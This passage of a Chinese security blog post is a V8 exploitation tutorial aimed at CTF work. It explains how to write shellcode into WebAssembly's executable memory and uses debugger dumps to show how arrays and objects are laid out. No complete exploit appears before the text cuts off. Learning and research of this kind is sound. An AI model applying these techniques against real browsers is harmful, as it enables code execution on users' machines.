<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>V8-通用利用链 | Daily Study</title><meta name="author" content="C0KE"><meta name="copyright" content="C0KE"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="V8-通用利用链首先需要明确的是，通过 v8 漏洞，我们需要达成什么样的目的？ 一般在做 CTF 的时候，往往希望让远程执行 system(“&#x2F;bin&#x2F;sh”) 或者 execve(“&#x2F;bin&#x2F;sh”,0,0) 又或者 ORW ，除了最后一个外，往往一般是希望能够做到远程命令执行，所以一般通过 v8 漏洞也希望能够做到这一点。一般来说，我们希望能往里面写入s">
<meta property="og:type" content="article">
<meta property="og:title" content="V8-通用利用链">
<meta property="og:url" content="http://c0ke.top/2025/07/30/V8-%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/index.html">
<meta property="og:site_name" content="Daily Study">
<meta property="og:description" content="V8-通用利用链首先需要明确的是，通过 v8 漏洞，我们需要达成什么样的目的？ 一般在做 CTF 的时候，往往希望让远程执行 system(“&#x2F;bin&#x2F;sh”) 或者 execve(“&#x2F;bin&#x2F;sh”,0,0) 又或者 ORW ，除了最后一个外，往往一般是希望能够做到远程命令执行，所以一般通过 v8 漏洞也希望能够做到这一点。一般来说，我们希望能往里面写入s">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E7%99%BD%E5%A4%A9.png">
<meta property="article:published_time" content="2025-07-30T03:04:06.717Z">
<meta property="article:modified_time" content="2025-07-30T06:16:42.543Z">
<meta property="article:author" content="C0KE">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E7%99%BD%E5%A4%A9.png"><link rel="shortcut icon" href="/img/fa.jpg"><link rel="canonical" href="http://c0ke.top/2025/07/30/V8-%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: '加载更多'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'V8-通用利用链',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2025-07-30 14:16:42'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (false) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/73c31ad1881611ebb6edd017c2d2eca2.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">404</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">60</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E7%99%BD%E5%A4%A9.png')"><nav id="nav"><span id="blog-info"><a href="/" title="Daily Study"><span class="site-name">Daily Study</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">V8-通用利用链</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-30T03:04:06.717Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-30T06:16:42.543Z" title="更新于 2025-07-30 14:16:42">2025-07-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/CVE-2020-6537/">CVE-2020-6537</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="V8-通用利用链"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="V8-通用利用链"><a href="#V8-通用利用链" class="headerlink" title="V8-通用利用链"></a>V8-通用利用链</h1><p>首先需要明确的是，通过 v8 漏洞，我们需要达成什么样的目的？</p>
<p>一般在做 CTF 的时候，往往希望让远程执行 system(“&#x2F;bin&#x2F;sh”) 或者 execve(“&#x2F;bin&#x2F;sh”,0,0) 又或者 ORW ，除了最后一个外，往往一般是希望能够做到远程命令执行，所以一般通过 v8 漏洞也希望能够做到这一点。一般来说，我们希望能往里面写入shellcode，毕竟栈溢出之类的操作在 v8 下似乎不太可能完成。</p>
<h2 id="WASM的利用"><a href="#WASM的利用" class="headerlink" title="WASM的利用"></a>WASM的利用</h2><p>既然要写 shellcode，就需要保证内存中存在可读可写可执行的内存段了。在没有特殊需求的情况下，程序不可能特地开辟一块这样的内存段供用户使用，但在如今支持 WASM(WebAssembly) 的浏览器版本中，一般都需要开辟一块这样的内存用以执行汇编指令，回想上一节给出的测试代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line">%<span class="title class_">DebugPrint</span>(f);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(wasmInstance);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>

<p>此处调用了 WebAssembly 模块为 WASM 创建专用的内存段，当我们执行到第二个断点后，通过 “vmmap” 指令可以发现内存中多了一个特殊的内存段：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">    0x226817c0d000     0x226817c0e000 rwxp     1000 0      [anon_226817c0d]</span><br></pre></td></tr></table></figure>

<p>那么现在这段内存就能够为我们所用了。如果我们向其中写入 shellcode ，日后在执行 WASM 时就会转而执行我们写入的攻击代码了</p>
<p>由于 v8 一般都是开启了所有保护的，为此我们需要像 CTF 题那样先泄露地址，然后再达成任意地址写</p>
<blockquote>
<p>这里会有一个疑问，既然是浏览器，难道不能自己构建WASM直接拿下吗？怎么还需要自己去写 shellcode？</p>
<p>结论是，WASM不允许执行需要系统调用才能完成的操作。 更准确的说，WASM并不是汇编代码，而是 v8 会根据这段数据生成一段汇编然后加载到内存段中去执行，而检查该代码是否存在系统调用就发生在这一步。 如果通过构造合法的WASM使其创造内存段，然后在之后的操作里写入非法的 Shellcode，就能够完成利用了。</p>
</blockquote>
<h2 id="高版本的变化"><a href="#高版本的变化" class="headerlink" title="高版本的变化"></a>高版本的变化</h2><p>这里有一个不得不说的问题是，在后来的版本中，不会再开辟这样的内存段了</p>
<p>我们可以先看看现在这个内存段中放入的数据是什么：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">    0x226817c0d000     0x226817c0e000 rwxp     1000 0      [anon_226817c0d]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">tel 0x226817c0d000 20</span></span><br><span class="line">00:0000│  0x226817c0d000 ◂— jmp    0x226817c0d480 /* 0xcccccc0000047be9 */</span><br><span class="line">01:0008│  0x226817c0d008 ◂— int3    /* 0xcccccccccccccccc */</span><br><span class="line">... ↓     6 skipped</span><br><span class="line">08:0040│  0x226817c0d040 ◂— jmp    qword ptr [rip + 2] /* 0x90660000000225ff */</span><br><span class="line">09:0048│  0x226817c0d048 —▸ 0x55b126522940 (Builtins_ThrowWasmTrapUnreachable) ◂— mov    eax, 0x2d6</span><br><span class="line">0a:0050│  0x226817c0d050 ◂— jmp    qword ptr [rip + 2] /* 0x90660000000225ff */</span><br><span class="line">0b:0058│  0x226817c0d058 —▸ 0x55b126522980 (Builtins_ThrowWasmTrapMemOutOfBounds) ◂— mov    eax, 0x2d8</span><br><span class="line">0c:0060│  0x226817c0d060 ◂— jmp    qword ptr [rip + 2] /* 0x90660000000225ff */</span><br><span class="line">0d:0068│  0x226817c0d068 —▸ 0x55b1265229c0 (Builtins_ThrowWasmTrapUnalignedAccess) ◂— mov    eax, 0x2da</span><br><span class="line">0e:0070│  0x226817c0d070 ◂— jmp    qword ptr [rip + 2] /* 0x90660000000225ff */</span><br><span class="line">0f:0078│  0x226817c0d078 —▸ 0x55b126522a00 (Builtins_ThrowWasmTrapDivByZero) ◂— mov    eax, 0x2dc</span><br><span class="line">10:0080│  0x226817c0d080 ◂— jmp    qword ptr [rip + 2] /* 0x90660000000225ff */</span><br><span class="line">11:0088│  0x226817c0d088 —▸ 0x55b126522a40 (Builtins_ThrowWasmTrapDivUnrepresentable) ◂— mov    eax, 0x2de</span><br><span class="line">12:0090│  0x226817c0d090 ◂— jmp    qword ptr [rip + 2] /* 0x90660000000225ff */</span><br><span class="line">13:0098│  0x226817c0d098 —▸ 0x55b126522a80 (Builtins_ThrowWasmTrapRemByZero) ◂— mov    eax, 0x2e0</span><br></pre></td></tr></table></figure>

<p>接下来笔者换到了截至至 2022.7.5 为止的最新版，我们再次重复之前的操作，看看这次 WASM 被放到了哪里：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">vmmap</span></span><br><span class="line">     0x88d46808000      0x88d46809000 r-xp     1000 0      [anon_88d46808]</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">tel 0x88d46808000 20</span></span><br><span class="line">00:0000│  0x88d46808000 ◂— jmp    0x88d46808580</span><br><span class="line">01:0008│  0x88d46808008 ◂— int3   </span><br><span class="line">... ↓     6 skipped</span><br><span class="line">08:0040│  0x88d46808040 ◂— jmp    qword ptr [rip + 2]</span><br><span class="line">09:0048│  0x88d46808048 —▸ 0x7f7da298ca80 (Builtins_ThrowWasmTrapUnreachable) ◂— mov    eax, 0x31e</span><br><span class="line">0a:0050│  0x88d46808050 ◂— jmp    qword ptr [rip + 2]</span><br><span class="line">0b:0058│  0x88d46808058 —▸ 0x7f7da298cac0 (Builtins_ThrowWasmTrapMemOutOfBounds) ◂— mov    eax, 0x320</span><br><span class="line">0c:0060│  0x88d46808060 ◂— jmp    qword ptr [rip + 2]</span><br><span class="line">0d:0068│  0x88d46808068 —▸ 0x7f7da298cb00 (Builtins_ThrowWasmTrapUnalignedAccess) ◂— mov    eax, 0x322</span><br><span class="line">0e:0070│  0x88d46808070 ◂— jmp    qword ptr [rip + 2]</span><br><span class="line">0f:0078│  0x88d46808078 —▸ 0x7f7da298cb40 (Builtins_ThrowWasmTrapDivByZero) ◂— mov    eax, 0x324</span><br><span class="line">10:0080│  0x88d46808080 ◂— jmp    qword ptr [rip + 2]</span><br><span class="line">11:0088│  0x88d46808088 —▸ 0x7f7da298cb80 (Builtins_ThrowWasmTrapDivUnrepresentable) ◂— mov    eax, 0x326</span><br><span class="line">12:0090│  0x88d46808090 ◂— jmp    qword ptr [rip + 2]</span><br><span class="line">13:0098│  0x88d46808098 —▸ 0x7f7da298cbc0 (Builtins_ThrowWasmTrapRemByZero) ◂— mov    eax, 0x328</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span></span><br></pre></td></tr></table></figure>

<p>这段新增的内存段内容是完全相同的，但区别在于，高版本下的 WASM 内存段不再可写了，只有可读可执行权限，似乎不再能这样攻击了</p>
<p>不过最开始的学习总归是从低版本向着高版本发展，接下来的内容也将以 “9.6.180.6” 版本为准，就像最开始学习 PWN 时从 Glibc2.23 开始那样(不过我估计有的大佬会从更低的版本开始……)</p>
<h2 id="数据储存方式"><a href="#数据储存方式" class="headerlink" title="数据储存方式"></a>数据储存方式</h2><p>用下面的脚本简单看看每个对象在内存中是如何储存的：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//demo.js</span></span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br><span class="line">a= [<span class="number">2.1</span>];</span><br><span class="line">b=&#123;<span class="string">&quot;a&quot;</span>:<span class="number">1</span>&#125;;</span><br><span class="line">c=[b];</span><br><span class="line">d=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>];</span><br><span class="line">%<span class="title class_">DebugPrint</span>(a);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(b);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(c);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(d);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>

<h3 id="JSArray-a"><a href="#JSArray-a" class="headerlink" title="JSArray:a"></a>JSArray:a</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">hex 0x3ea308085b99-1</span></span><br><span class="line">+0000 0x3ea308085b98  09 19 24 08 e9 06 04 08  89 5b 08 08 02 00 00 00 </span><br><span class="line">+0010 0x3ea308085ba8  01 4e 24 08 e9 06 04 08  e9 06 04 08 02 00 00 00  </span><br><span class="line">+0020 0x3ea308085bb8  c5 01 04 08 01 00 01 00  00 00 00 00 6d 11 04 08 </span><br><span class="line">+0030 0x3ea308085bc8  61 53 04 08 88 00 00 00  02 00 00 00 b1 04 04 08 </span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x3ea308085b99</span></span><br><span class="line">0x3ea308085b99: [JSArray]</span><br><span class="line"> - map: 0x3ea308241909 &lt;Map(PACKED_DOUBLE_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3ea3082092dd &lt;JSArray[0]&gt;</span><br><span class="line"> - elements: 0x3ea308085b89 &lt;FixedDoubleArray[1]&gt; [PACKED_DOUBLE_ELEMENTS]</span><br><span class="line"> - length: 1</span><br><span class="line"> - properties: 0x3ea3080406e9 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #length: 0x3ea308180165 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: 0x3ea308085b89 &lt;FixedDoubleArray[1]&gt; &#123;</span><br><span class="line">           0: 2.1</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看出，一个 JSArray 在内存中的布局如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| 32bit map addr | 32bit properties addr | 32bit elements addr | 32bit length |</span><br></pre></td></tr></table></figure>

<p><img src="/picture%5CV8-%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE%5Cimage-20250614111932613-1749871225343-2.png" alt="image-20250614111932613"></p>
<p>而其 elements 结构体的内存布局如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x3ea308085b89</span></span><br><span class="line">0x3ea308085b89: [FixedDoubleArray]</span><br><span class="line"> - map: 0x3ea308040a3d &lt;Map&gt;</span><br><span class="line"> - length: 1</span><br><span class="line">           0: 2.1</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">hex 0x3ea308085b89-1</span></span><br><span class="line">+0000 0x3ea308085b88  3d 0a 04 08 02 00 00 00  cd cc cc cc cc cc 00 40 </span><br><span class="line">+0010 0x3ea308085b98  09 19 24 08 e9 06 04 08  89 5b 08 08 02 00 00 00 </span><br><span class="line">+0020 0x3ea308085ba8  01 4e 24 08 e9 06 04 08  e9 06 04 08 02 00 00 00 </span><br><span class="line">+0030 0x3ea308085bb8  c5 01 04 08 01 00 01 00  00 00 00 00 6d 11 04 08 </span><br></pre></td></tr></table></figure>

<p><img src="/picture%5CV8-%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE%5Cimage-20250614112617204.png" alt="image-20250614112617204"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">| 32bit map addr | 32bit length | 64bit value |</span><br></pre></td></tr></table></figure>

<p>并且我们可以注意到，elements+0x10&#x3D;&amp;a，这说明这两个结构体在内存上相邻，如果 elements 的内容溢出了，就有可能覆盖 DoubleArray 结构体中的数据</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">| 32bit map addr | 32bit length          | 64bit value                        |elements</span><br><span class="line">| 32bit map addr | 32bit properties addr | 32bit elements addr | 32bit length |jsarray</span><br></pre></td></tr></table></figure>

<blockquote>
<p>v8 储存数据的方式有些特别，它会让这些整数都乘以二，也包括数组的长度，因此当 job 认为该地址是一个数字类型时，会将其除以二后的值当作本来的值，或者说，将原值左移一位后储存。这里的 length 也都被乘以二了</p>
</blockquote>
<h3 id="JS-OBJECT-TYPE-b"><a href="#JS-OBJECT-TYPE-b" class="headerlink" title="JS_OBJECT_TYPE:b"></a>JS_OBJECT_TYPE:b</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">job 0x3ea308085ba9</span></span><br><span class="line">0x3ea308085ba9: [JS_OBJECT_TYPE]</span><br><span class="line"> - map: 0x3ea308244e01 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x3ea30820134d &lt;Object map = 0x3ea3082401c1&gt;</span><br><span class="line"> - elements: 0x3ea3080406e9 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: 0x3ea3080406e9 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #a: 1 (const data field 0)</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">hex 0x3ea308085ba9-1</span></span><br><span class="line">+0000 0x3ea308085ba8  01 4e 24 08 e9 06 04 08  e9 06 04 08 02 00 00 00 </span><br><span class="line">+0010 0x3ea308085bb8  c5 01 04 08 01 00 01 00  00 00 00 00 6d 11 04 08 </span><br><span class="line">+0020 0x3ea308085bc8  61 53 04 08 88 00 00 00  02 00 00 